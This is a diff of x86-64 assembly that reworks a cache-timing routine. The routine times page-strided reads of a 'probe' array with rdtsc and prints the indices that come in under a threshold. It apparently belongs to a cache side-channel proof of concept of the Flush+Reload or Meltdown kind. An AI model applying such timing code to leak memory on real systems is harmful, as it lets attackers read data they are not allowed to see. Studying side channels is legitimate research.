@@ -209,20 +209,24 @@ no_new_min:
     syscall
 
     xor   RCX,RCX
-    mov   RSI,analyse
 search_hit:
+    push  RCX
+    mov   RSI,analyse
     mov   RAX,[RSI+8*RCX]
     cmp   RAX,R13
     jge   no_hit
     mov   RAX,RCX
     mov   RDI,print_area
     call  printhb
-    mov   RDX,2
+    mov   AL,' '
+    stosb
+    mov   RDX,3
     mov   RAX,1               ; sys write
     mov   RDI,1               ; stdout
     mov   RSI,print_area
     syscall
 no_hit:
+    pop   RCX
     inc   RCX
     cmp   RCX,256
     jl    search_hit
@@ -247,29 +251,27 @@ determine_cache_hit:
     mov   RSI,probe
     mov   RDI,analyse         ; load address of the analyse array
     mov   RBX,page_size       ; size of the pages
-    xor   RCX,RCX
+    tzcnt RCX,RBX
+    xor   RBX,RBX             ; RBX is used as counter
 next_analyse:
-    lfence
+    mov   R8,RBX
+    shl   R8,CL               ; multiply with the page size
+    mfence
     rdtsc                     ; get the time stamp counter
+    mov   R9b,[RSI+R8]
     shl   RDX,32              ; mov EDX to the high double word
     add   RAX,RDX             ; add it to the low double word
     mov   R15,RAX
-    mov   RAX,RCX
-    mov   RDX,RCX
-    tzcnt RCX,RBX
-    shl   RAX,CL              ; multiply with the page size
-    mov   RCX,RDX
-    mov   DL,[RSI+RAX]
 
-    lfence
+    mfence
     rdtsc                     ; get the time stamp counter
     shl   RDX,32              ; mov EDX to the high double word
     add   RAX,RDX             ; add it to the low double word
     sub   RAX,R15
     stosq
 
-    inc   RCX
-    cmp   RCX,256
+    inc   RBX
+    cmp   RBX,256
     jl    next_analyse
 
     ret
